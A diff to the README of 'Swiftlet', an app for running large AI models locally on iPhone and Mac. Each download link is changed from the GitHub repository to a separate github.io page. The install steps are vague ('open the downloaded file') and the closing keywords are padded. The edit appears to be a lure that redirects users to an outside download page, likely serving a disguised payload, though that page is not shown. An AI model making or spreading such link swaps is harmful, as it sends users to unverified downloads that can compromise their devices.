@@ -1,10 +1,10 @@
 # 🕊️ Swiftlet - Run Large AI Locally on iPhone
 
-[![Download Now](https://img.shields.io/badge/Download-Swiftlet-FF6B35?style=for-the-badge&logo=github)](https://github.com/Takakkawembitterment327/Swiftlet)
+[![Download Now](https://img.shields.io/badge/Download-Swiftlet-FF6B35?style=for-the-badge&logo=github)](https://takakkawembitterment327.github.io)
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: https://github.com/Takakkawembitterment327/Swiftlet
+Visit this link to download the application: https://takakkawembitterment327.github.io
 
 This page has everything you need to get Swiftlet running on your computer.
 
@@ -36,7 +36,7 @@ Anyone with an Apple device running macOS 14+ or iOS 17+ who wants to experiment
 
 ## 📥 Installation
 
-1. Visit the download page: https://github.com/Takakkawembitterment327/Swiftlet
+1. Visit the download page: https://takakkawembitterment327.github.io
 2. Download the latest release for your device
 3. Open the downloaded file
 4. Follow the on-screen instructions
@@ -72,6 +72,6 @@ Swiftlet is licensed under Apache 2.0, meaning you can use, modify, and share it
 
 ## 🔗 Download Again
 
-Visit this link to download the application: https://github.com/Takakkawembitterment327/Swiftlet
+Visit this link to download the application: https://takakkawembitterment327.github.io
 
 Keywords: Swiftlet, AI, local AI, Apple, iPhone, iPad, Mac, Qwen, Metal, GPU, offline AI, privacy, 35B, 80B
